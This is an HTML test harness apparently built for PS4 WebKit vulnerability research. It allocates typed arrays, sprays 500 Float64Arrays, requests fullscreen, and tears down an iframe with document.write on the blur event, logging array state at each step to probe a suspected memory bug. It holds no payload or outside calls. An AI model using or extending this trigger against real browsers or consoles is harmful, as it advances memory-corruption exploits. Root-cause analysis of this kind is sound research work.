<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Fullscreen Blur TypedArray Root Cause</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; }
iframe { width:100%; height:420px; border:1px solid #0f0; }
pre { white-space:pre-wrap; }
</style>
</head>

<body>
<h2>PARENT LOGGER</h2>
<pre id="log"></pre>

<iframe id="testframe"></iframe>

<script>
const log = m => {
    document.getElementById("log").textContent += m + "\n";
};

const iframe = document.getElementById("testframe");
const doc = iframe.contentDocument;

doc.open();
doc.write(`
<!DOCTYPE html>
<html>
<body style="background:#111;color:#0f0;font-family:monospace;">
<h3>IFRAME TEST CONTROLS</h3>

<button onclick="start('A')">TEST A (no buffer / no array)</button>
<button onclick="start('B')">TEST B (ArrayBuffer only)</button>
<button onclick="start('C')">TEST C (Float64Array only)</button>
<button onclick="start('D')">TEST D (Buffer + Float64Array)</button>

<pre id="ilog"></pre>

<script>
let buffer = null;
let f64 = null;
let spray = [];

function ilog(m){
    document.getElementById("ilog").textContent += m + "\\n";
    parent.postMessage(m, "*");
}

function snapshot(tag){
    ilog(tag);
    try{
        ilog("  buffer.byteLength = " + (buffer ? buffer.byteLength : "null"));
        ilog("  f64.length = " + (f64 ? f64.length : "null"));
        ilog("  f64[0] = " + (f64 ? f64[0] : "null"));
    }catch(e){
        ilog("  snapshot exception");
    }
}

function start(mode){
    ilog("\\n=== START TEST " + mode + " ===");

    /* STEP 1 – Allocation */
    if(mode === "B" || mode === "D"){
        buffer = new ArrayBuffer(64);
        ilog("[ALLOC] ArrayBuffer 64 bytes");
    }

    if(mode === "C" || mode === "D"){
        if(!buffer) buffer = new ArrayBuffer(64);
        f64 = new Float64Array(buffer);
        f64[0] = 13.37;
        ilog("[ALLOC] Float64Array length=" + f64.length);
    }

    if(f64){
        for(let i=0;i<500;i++){
            spray.push(new Float64Array(8));
        }
        ilog("[SPRAY] Float64Array spray alive=" + spray.length);
    }

    snapshot("[SNAPSHOT] before fullscreen");

    /* STEP 2 – Fullscreen */
    document.documentElement.webkitRequestFullscreen();
    ilog("[STATE] fullscreen requested");
}

/* STEP 3 – Blur */
window.onblur = function(){
    ilog("[EVENT] blur detected");
    snapshot("[SNAPSHOT] after blur");

    /* STEP 4 – Teardown */
    ilog("[TEARDOWN] document.write iframe");
    document.write("<h1>IFRAME TEARDOWN</h1>");
};
<\/script>
</body>
</html>
`);
doc.close();

window.addEventListener("message", e => log("[MSG] " + e.data));
</script>
</body>
</html>
